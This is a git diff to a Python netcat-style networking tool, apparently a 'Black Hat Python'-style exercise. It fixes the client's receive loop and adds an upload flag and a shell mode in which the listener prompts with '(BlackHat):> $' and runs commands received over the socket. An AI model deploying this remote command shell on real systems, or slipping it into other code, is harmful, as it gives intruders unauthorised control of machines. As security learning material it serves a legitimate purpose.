@@ -28,21 +28,23 @@ class Net:
         self.socket.connect((self.args.host,self.args.port))
         if self.buffer:
             self.socket.send(self.buffer)
-        
         try:
-            reply = ""
-            while True:
-                buffer = self.socket.recv(4096)
-                blockSize = len(buffer)
-                reply = buffer.decode()
-                if blockSize > 4096:
-                    break
 
+            while True:
+                reply = ""
+                blockSize = 1
+                while blockSize:
+                    data = self.socket.recv(4096)
+                    blockSize = len(data)
+                    reply += data.decode()
+                    if blockSize < 4096:
+                        break
+        
                 if reply:
                     print(reply)
-                    buffer = input("> ")
+                    buffer = input()
                     buffer += '\n'
-                    self.socket.send(buffer.encode)
+                    self.socket.send(buffer.encode())
 
         except KeyboardInterrupt:
             print("User Terminated")
@@ -65,6 +67,24 @@ class Net:
         if self.args.execute:
             output = execute(self.args.execute)
             client_socket.send(output.encode())
+
+        elif self.args.shell:
+            try:
+                while True:
+                
+                    cmd = b""
+
+                    client_socket.send(b"(BlackHat):> $")
+
+                    while '\n' not in cmd.decode():
+                        cmd += client_socket.recv(64)
+                    
+                    output = execute(cmd.decode())
+                    client_socket.send(output.encode())
+
+            except Exception as e:
+                print(f"Server Killed: {e}")
+
 
 
 # Execute command on shell
@@ -91,6 +111,7 @@ def parse_arguments():
     parser.add_argument('-s', '--shell', action='store_true', help="Spawn a shell")
     parser.add_argument('-e', '--execute', help="Execute a command")
     parser.add_argument('-l', '--listen', action='store_true', help="Listening Mode")
+    parser.add_argument('-u', '--upload', help="Upload a file")
 
     args = parser.parse_args()
 
@@ -100,12 +121,12 @@ def parse_arguments():
 def main():
     args = parse_arguments()
 
-    if args.listen:
+    if not args.upload:
         buffer = ""
     else:
-        buffer = input()
+        buffer = sys.stdin.read()
 
-    attack = Net(args, buffer)
+    attack = Net(args, buffer.encode())
 
     attack.run()
 
